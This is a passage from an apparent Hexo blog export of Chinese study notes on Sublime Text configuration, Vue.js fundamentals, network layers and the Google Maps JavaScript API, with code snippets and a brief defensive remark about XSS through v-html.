class="line">&quot;translate_tabs_to_spaces&quot;: true,</span><br><span class="line">&quot;update_check&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="sublime-首选项-快捷键设置"><a href="#sublime-首选项-快捷键设置" class="headerlink" title="sublime 首选项-快捷键设置"></a>sublime 首选项-快捷键设置</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123; <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;tab&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;move&quot;</span>, <span class="attr">&quot;args&quot;</span>: &#123;<span class="attr">&quot;by&quot;</span>: <span class="string">&quot;characters&quot;</span>, <span class="attr">&quot;forward&quot;</span>: <span class="literal">true</span>&#125;, <span class="attr">&quot;context&quot;</span>:</span><br><span class="line">        [</span><br><span class="line">            &#123; <span class="attr">&quot;key&quot;</span>: <span class="string">&quot;following_text&quot;</span>, <span class="attr">&quot;operator&quot;</span>: <span class="string">&quot;regex_contains&quot;</span>, <span class="attr">&quot;operand&quot;</span>: <span class="string">&quot;^[)\\]\\&gt;\\&#x27;\\\&quot;]&quot;</span>, <span class="attr">&quot;match_all&quot;</span>: <span class="literal">true</span> &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="attr">&quot;keys&quot;</span>: [<span class="string">&quot;f5&quot;</span>], <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;run_existing_window_command&quot;</span>, </span><br><span class="line">            <span class="attr">&quot;args&quot;</span>:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;repl_python_run&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;file&quot;</span>: <span class="string">&quot;config/Python/Main.sublime-menu&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="安装markdown插件"><a href="#安装markdown插件" class="headerlink" title="安装markdown插件"></a>安装markdown插件</h4>]]></content>
      
      
      <categories>
          
          <category> 有道云笔记-搬 </category>
          
          <category> 配置 </category>
          
          <category> sublime配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> sublime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1+2. 数据绑定与第一个Vue应用</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/1-2-%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E4%B8%8E%E7%AC%AC%E4%B8%80%E4%B8%AAvue%E5%BA%94%E7%94%A8/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/1-2-%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E4%B8%8E%E7%AC%AC%E4%B8%80%E4%B8%AAvue%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="1-vue-js-gt-cdn"><a href="#1-vue-js-gt-cdn" class="headerlink" title="1.vue.js -&gt; cdn"></a>1.vue.js -&gt; cdn</h4><h5 id="传统技术栈-vs-vue-js-？"><a href="#传统技术栈-vs-vue-js-？" class="headerlink" title="传统技术栈 vs  vue.js +？"></a>传统技术栈 vs  vue.js +？</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">jQuery</span> + <span class="selector-tag">RequireJS</span>(SeaJS)+<span class="selector-tag">artTemplate</span>(doT)+<span class="selector-tag">Gulp</span>(Grunt)</span><br><span class="line"><span class="selector-tag">jQuery</span>:兼容浏览器</span><br><span class="line"><span class="selector-tag">RequiereJS</span>:模块化开发时解决代码依赖混乱的问题？</span><br><span class="line"><span class="selector-tag">artTemplate</span>: <span class="selector-tag">HTML</span>模版（数据与<span class="selector-tag">HTMl</span>模版分离）</span><br><span class="line"><span class="selector-tag">Gulp</span>:合并压缩代码 ？</span><br></pre></td></tr></table></figure><h5 id="vue-js-cdn："><a href="#vue-js-cdn：" class="headerlink" title="vue.js  cdn："></a>vue.js  cdn：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--一自动识别最新稳定版本的 Vue.js --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>= <span class="string">&quot;https://unpkg.com/vue/dist/vue.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定某个具体版本的 Vue.js --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue@2.1.6/dist/vue.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h5 id="示例说明"><a href="#示例说明" class="headerlink" title="示例说明:"></a>示例说明:</h5><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v-<span class="keyword">for</span>=<span class="string">&quot;book in books&quot;</span> &gt;&#123;&#123;book.<span class="keyword">name</span>&#125;&#125;  循环</span><br><span class="line"></span><br><span class="line">new vue &gt;&gt;  <span class="keyword">data</span> ： &#123;books:[&#123;<span class="keyword">name</span>:<span class="string">&quot;&quot;</span>&#125;,&#123;<span class="keyword">name</span>:<span class="string">&quot;&quot;</span>&#125;,&#123;<span class="keyword">name</span>:<span class="string">&quot;&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><h4 id="2-Vue-实例-与-数据绑定"><a href="#2-Vue-实例-与-数据绑定" class="headerlink" title="2. Vue 实例 与 数据绑定"></a>2. Vue 实例 与 数据绑定</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">input[type=text] v-model=name</span><br><span class="line">标签内 &#123;&#123;name&#125;&#125;</span><br><span class="line"><span class="section">new vue data :&#123;name:&#x27;&#x27;&#125;</span></span><br><span class="line"><span class="section">--------------------</span></span><br><span class="line">三个地方  有name </span><br></pre></td></tr></table></figure><p>数据的绑定</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var myData=&#123; a: 1&#125;</span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line"><span class="code">    el:&#x27;#app&#x27;,</span></span><br><span class="line"><span class="code">    data:myData</span></span><br><span class="line"><span class="section">&#125;)</span></span><br><span class="line"><span class="section">---------------</span></span><br><span class="line">app.a === mydata.a   都可以访问(get)和修改(set)  </span><br><span class="line">app.$el</span><br></pre></td></tr></table></figure><h5 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">生命周期钩子<span class="selector-tag">hook</span>   何时调用</span><br><span class="line"><span class="selector-tag">created</span>:示例创建完成后调用，用来初始化一些数据(el还不可用)</span><br><span class="line"><span class="selector-tag">mounted</span>：<span class="selector-tag">el</span>挂载到实例上后调用，一般是第一个业务逻辑开始的地方</span><br><span class="line"><span class="selector-tag">beforeDestroy</span>：实例销毁前调用，用来解绑一些监听事件(addEventListener)</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/gao_xu_520/article/details/80915400">—–博客：生命周期讲解—–</a><br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g3bjpl8mwaj30xc2cfaip.jpg" alt="img"></p><h5 id="插值与表达式"><a href="#插值与表达式" class="headerlink" title="插值与表达式"></a>插值与表达式</h5><ol><li><p>输出纯文本</p><h6 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    el:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">date</span>:<span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">mounted</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _this=<span class="built_in">this</span>;  <span class="comment">//声明一个变量指向Vue实例this，保证作用域一致</span></span><br><span class="line">        <span class="built_in">this</span>.timer=<span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            _this.date=<span class="keyword">new</span> <span class="built_in">Date</span>(); <span class="comment">//修改数据 date</span></span><br><span class="line">        &#125;,<span class="number">1000</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">beforeDestory</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.timer)&#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(<span class="built_in">this</span>.timer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">----------------</span><br><span class="line">data --&gt;  date=<span class="keyword">new</span> <span class="built_in">Date</span>()  最开始初始化一下时间</span><br><span class="line"><span class="attr">mounted</span>:  el 挂载后调用</span><br><span class="line"><span class="built_in">this</span>.timer  与  _this.date  ?</span><br><span class="line"><span class="built_in">setInterval</span>(方法，时间间隔)  循环执行一个方法</span><br><span class="line"><span class="attr">beforeDestory</span>:示例销毁前调用</span><br><span class="line"><span class="built_in">clearInterval</span>(<span class="built_in">this</span>.timers)   清理定时器</span><br></pre></td></tr></table></figure></li><li><p>v-html=””   输出html</p><h6 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h6><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">div#app</span><br><span class="line"><span class="code">    &lt;span v-html=&quot;link&quot;&gt;&lt;/span&gt;  //注意：v-html 在 &lt;&gt;里面</span></span><br><span class="line"><span class="code">    script</span></span><br><span class="line"><span class="code">        new Vue()&#123;&#125;</span></span><br><span class="line"><span class="section">            data:&#123;link:&#x27;&lt;a href=&quot;#&quot;&gt;这是一个链接&lt;/a&gt;&#x27;&#125;</span></span><br><span class="line"><span class="section">---------</span></span><br><span class="line">link 的内容将会渲染为一个具有点击功能的a标签，而不是纯文本。</span><br><span class="line"><span class="bullet">** </span>如果将用户产生的内容使用 v-html 输出后，可能导致 XSS 攻击，所以要在服务端对用户提交的内容进行处理(可将&lt;&gt;  转义)</span><br></pre></td></tr></table></figure></li><li><p>v-pre  不编译</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">v-pre</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">跳过这个元素和它的子元素的编译过程</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">直接显示  &#x27;</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="xml">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>直接使用JavaScript表达式</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">number/10</span>&#125;&#125;</span><span class="xml">   //100  --&gt;  10</span></span><br><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123;<span class="name">isOK</span> ? <span class="string">&#x27;确定&#x27;</span> : <span class="string">&#x27;取消&#x27;</span>&#125;&#125;</span><span class="xml">  // false --&gt;  取消</span></span><br><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123;<span class="name">text.split</span>(<span class="name">&#x27;,&#x27;</span>).reverse.join(<span class="name">&#x27;&#x27;</span>)&#125;&#125;</span><span class="xml">  //123,456  --&gt;  456,123</span></span><br><span class="line"><span class="xml">--------</span></span><br><span class="line"><span class="xml">不支持:</span></span><br><span class="line"><span class="xml">    语句  </span><span class="template-variable">&#123;&#123;<span class="name">var</span> <span class="attr">book</span>=<span class="string">&#x27;Vue.js实战&#x27;</span>&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    流控制  </span><span class="template-variable">&#123;&#123;<span class="name"><span class="builtin-name">if</span></span> (<span class="name">ik</span>) return msg&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml">    用户自定义的全局变量</span></span><br></pre></td></tr></table></figure><h5 id="过滤器插值的尾部添加-实现"><a href="#过滤器插值的尾部添加-实现" class="headerlink" title="过滤器插值的尾部添加 | 实现"></a>过滤器插值的尾部添加 | 实现</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">date</span>|formatDate&#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">new Vue() -&gt; filters:&#123; formatDate:function(value)&#123;...&#125; &#125;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">----------</span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 过滤器 串联 --&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123; <span class="name">message</span> | filterA | filterB &#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 接收多个参数 (message 算一个参数)--&gt;</span></span></span><br><span class="line"><span class="xml"></span><span class="template-variable">&#123;&#123;<span class="name">message</span> | filterA(<span class="name">&#x27;arg2&#x27;</span>,<span class="string">&#x27;arg3&#x27;</span>) &#125;&#125;</span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure></li></ol><h4 id="指令与事件"><a href="#指令与事件" class="headerlink" title="指令与事件"></a>指令与事件</h4><p>指令:当表达式的值改变时，相应地将某些行为应用到DOM上</br><br>指令如：<code>v-for,v-html,v-pre,v-if(DOM是否显示)</code></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">v-bind: 地址与数据绑定</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line">div</span><br><span class="line"><span class="code">    &lt;a v-bind:href=&quot;url&quot;&gt;链接&lt;/a&gt;</span></span><br><span class="line"><span class="code">    &lt;img v-bind:src=&quot;imgUrl&quot;&gt;</span></span><br><span class="line">+</span><br><span class="line">script -&gt; Vue() -&gt; data</span><br><span class="line"><span class="code">    url:&#x27;https://www.github.com&#x27;,</span></span><br><span class="line"><span class="code">    imgUrl:&#x27;http://xxx.xxx.xx.img.png&#x27;</span></span><br><span class="line">==&gt;  渲染结果：</span><br><span class="line"><span class="code">    &lt;a href=&quot;https://www.github.com&quot;&gt;链接&lt;/a&gt;</span></span><br><span class="line"><span class="section">    &lt;img src=&#x27;http://xxx.xxx.xx.img.png&#x27;&gt;</span></span><br><span class="line"><span class="section">---------------------------------</span></span><br><span class="line"><span class="section">v-on:绑定事件监听器(click,dblclick,keyup,mousemove)</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line">div</span><br><span class="line"><span class="code">    &lt;p v-if=&quot;show_&quot;&gt;一段文本&lt;/p&gt;</span></span><br><span class="line"><span class="code">    &lt;button v-on:click=&quot;handleToggle&quot;&gt;&lt;/button&gt;</span></span><br><span class="line">script -&gt; Vue()  </span><br><span class="line"><span class="code">    data</span></span><br><span class="line"><span class="code">        show_:true</span></span><br><span class="line"><span class="code">    methods</span></span><br><span class="line"><span class="code">        handleToggle:function()&#123;</span></span><br><span class="line"><span class="code">            this_=this;</span></span><br><span class="line"><span class="code">            this.show_=!(this_.show_);</span></span><br><span class="line"><span class="code">        &#125;</span></span><br><span class="line"><span class="section">==&gt;  点击按钮，显示或隐藏段落</span></span><br><span class="line"><span class="section">----------------------------------</span></span><br><span class="line">在 初始化时调用方法，或在外部调用方法</span><br><span class="line">script</span><br><span class="line"><span class="code">    app=new Vue()</span></span><br><span class="line"><span class="code">        methods:&#123;//定义一个方法</span></span><br><span class="line"><span class="code">            init:function(text)&#123;</span></span><br><span class="line"><span class="code">                console.log(text);s</span></span><br><span class="line"><span class="code">            &#125;</span></span><br><span class="line"><span class="code">        &#125;,</span></span><br><span class="line"><span class="code">        mounted:function()&#123;</span></span><br><span class="line"><span class="code">            this.init(&#x27;在初始化时调用&#x27;);</span></span><br><span class="line"><span class="code">        &#125;</span></span><br><span class="line"><span class="code">    </span></span><br><span class="line"><span class="code">    app.init(&#x27;通过外部调用实例app的方法&#x27;);</span></span><br></pre></td></tr></table></figure><h4 id="语法糖-简化代码"><a href="#语法糖-简化代码" class="headerlink" title="语法糖(简化代码)"></a>语法糖(简化代码)</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v-bind 可以直接省略</span><br><span class="line">    &lt;a v-bi<span class="symbol">nd:hr</span>ef=<span class="string">&quot;url&quot;</span>&gt;链接&lt;/a&gt;</span><br><span class="line">=&gt;  &lt;a <span class="symbol">:hr</span>ef=<span class="string">&quot;url&quot;</span>&gt;链接&lt;/a&gt;</span><br><span class="line">------</span><br><span class="line">v-on   <span class="string">&quot;@&quot;</span>表示</span><br><span class="line">    &lt;button v-<span class="symbol">on:cl</span>ick=<span class="string">&quot;handleClose&quot;</span>&gt;点击隐藏&lt;/button&gt;</span><br><span class="line">=&gt;  &lt;button @<span class="symbol">:cl</span>ick=<span class="string">&quot;handleClose&quot;</span>&gt;点击隐藏&lt;/button&gt;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li><p>声明周期:  created  mounted  beforeDestroy <br></p></li><li><p>插值 === html 中的变量 <code>&#123;&#123;var1&#125;&#125; , v-html=&quot;var2&quot; , v-bind:href=&quot;url1&quot; , v-on:click=&quot;f1&quot;   ... </code>  <br><br>过滤器  <code>date|formatDate  --&gt; filters:&#123;formatDate:function()&#123;&#125;  &#125;</code> <br></p></li><li><p>表达式：简单的运算，三元运算等 <br></p></li><li><p>其他 <code>mounted &gt;&gt; setInterval</code>  <br></p></li><li><p>指令与事件 <code>v-xxx</code></p></li><li><p>语法糖</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 《Vue.js 实战》笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5, 从物理层到MAC层：如何在宿舍里组网</title>
      <link href="/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/5-%E4%BB%8E%E7%89%A9%E7%90%86%E5%B1%82%E5%88%B0mac%E5%B1%82%EF%BC%9A%E5%A6%82%E4%BD%95%E5%9C%A8%E5%AE%BF%E8%88%8D%E9%87%8C%E7%BB%84%E7%BD%91/"/>
      <url>/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/5-%E4%BB%8E%E7%89%A9%E7%90%86%E5%B1%82%E5%88%B0mac%E5%B1%82%EF%BC%9A%E5%A6%82%E4%BD%95%E5%9C%A8%E5%AE%BF%E8%88%8D%E9%87%8C%E7%BB%84%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<ol><li>物理层<ul><li>实现工具<ul><li>交叉线，两台电脑组成最小局域网(LAN)</li><li>交换机(Hub)，广播的方式，每台电脑发出的包，每个电脑都能收到。</li></ul></li><li>实现数据交换</li><li>待解决问题(交给MAC层)：<ol><li>发出的包该给谁?</li><li>多台电脑同时发送，是否会混乱？(如何判定先发，后发)</li><li>发送的时候出现错误怎么办？</li></ol></li></ul></li><li>数据链路层(MAC层?)<ul><li>MAC:Medium Access Control，媒体控制访问</li><li>该给谁<span id="more"></span> </li><li>收发规则：多路访问<ul><li>信道划分</li><li>轮流协议</li><li>随机接入协议</li></ul></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Advance GIS：ReadMe</title>
      <link href="/categories/WebGIS/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/advance-gis%EF%BC%9Areadme/"/>
      <url>/categories/WebGIS/%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/advance-gis%EF%BC%9Areadme/</url>
      
        <content type="html"><![CDATA[<p><a href="http://gis.yohman.com/up206b/tutorials/">Advance GIS 教程网址</a><br><a href="https://github.com/linxiaoki/study_webgis/tree/master/Advance%20Gis">练习的文件</a></p><ol><li><p><strong>创建地图(map,marker,infoWindow)</strong></p> <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">map:  <span class="keyword">new</span> google.maps.<span class="constructor">Map($(&#x27;#<span class="params">map_canvas</span>&#x27;)</span>,options1)</span><br><span class="line">    options:位置(LatLng),缩放级别(Zoom),<span class="literal">[地图类别(<span class="identifier">mapTypeId</span>)]</span></span><br><span class="line">        LatLng:  <span class="keyword">new</span> google.maps.LatLng  </span><br><span class="line">        mapTypeId:<span class="literal">[ROADMAP]</span><span class="pattern-match">|[<span class="constructor">SATELLITE</span>]|[<span class="constructor">HYBRID</span>]</span></span><br><span class="line"><span class="pattern-match">marker=<span class="keyword">new</span> google.maps.<span class="constructor">Marker(<span class="params">options2</span>)</span></span></span><br><span class="line"><span class="pattern-match">    option: postion,map,title</span></span><br><span class="line"><span class="pattern-match">        postion: <span class="constructor">LatLng</span></span></span><br><span class="line"><span class="pattern-match">        map:</span></span><br><span class="line"><span class="pattern-match">        title:  [text]</span></span><br><span class="line"><span class="pattern-match">infowindow=<span class="keyword">new</span> google.maps.<span class="constructor">InfoWindow(<span class="params">options3</span>)</span></span></span><br><span class="line"><span class="pattern-match">    options:content</span></span><br><span class="line"><span class="pattern-match">        content: [text]</span></span><br><span class="line"><span class="pattern-match">google.maps.event.add<span class="constructor">Listener(<span class="params">marker</span>,&#x27;<span class="params">click</span>&#x27;,<span class="params">function</span>()</span>&#123;</span></span><br><span class="line"><span class="pattern-match">    infowindow.<span class="keyword">open</span>(map,marker);</span></span><br><span class="line"><span class="pattern-match">&#125;);</span></span><br><span class="line"><span class="pattern-match">task: (1) 添加多个marker  (2) 更改marker图标</span></span><br></pre></td></tr></table></figure><span id="more"></span></li><li><p>**Add more Marker **</br><br>创建js以解决重复造轮子。</p><ul><li>创建单个标记<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> myLatlng=<span class="built_in">new</span> google.maps.LatLng(<span class="number">34</span>,-<span class="number">118</span>);</span><br><span class="line"><span class="built_in">var</span> marker=<span class="built_in">new</span> google.maps.Marker(&#123;</span><br><span class="line">    <span class="built_in">position</span>:myLatlng,</span><br><span class="line">    <span class="built_in">map</span>;<span class="built_in">map</span>,</span><br><span class="line">    <span class="built_in">title</span>:<span class="string">&quot;Santa Monica&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ol><ul><li>自定义函数，创建多个标记<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">funciton createMarker(latitude,longitude,<span class="built_in">title</span>)&#123;</span><br><span class="line">    <span class="built_in">var</span> markerLatLng = <span class="built_in">new</span> google.maps.LatLng(latitude,longitude);</span><br><span class="line">    <span class="built_in">var</span> marker = <span class="built_in">new</span> google.maps.Marker(&#123;</span><br><span class="line">        <span class="built_in">position</span>: markerLatLng,</span><br><span class="line">        <span class="built_in">map</span>: <span class="built_in">map</span>,</span><br><span class="line">        <span class="built_in">title</span>: <span class="built_in">title</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">createMarker(<span class="number">34.01</span>,-<span class="number">118</span>,&#x27;Santa Monica&#x27;);</span><br><span class="line">creaetMarker(<span class="number">34.02</span>,-<span class="number">118</span>,&#x27;culver city&#x27;);</span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li><strong>Buffer/Circle 缓冲区</strong><br><a href="https://developers.google.com/maps/documentation/javascript/shapes#circle_add">开发文档-添加圆形</a><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bufferOptions=&#123;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> cityCircle = <span class="keyword">new</span> <span class="type">google</span>.maps.Circle(bufferOptions);</span><br></pre></td></tr></table></figure></li></ol><p>2.1 <strong>Javascript 函数：创建命名空间</strong><br>** 函数默认在’global’命名空间中，为了避免函数名与别人混淆，需要自定义命名空间 **</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#自定义 命名空间 kass</span></span><br><span class="line"><span class="keyword">var</span> kass=&#123;&#125;</span><br><span class="line"><span class="meta">#在命名空间 kass 下定义函数</span></span><br><span class="line">kass.holleworld=function(yourname)&#123;</span><br><span class="line">    console.log(yourname+<span class="string">&quot;,hello world!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#使用函数</span></span><br><span class="line">kass.helloworld(<span 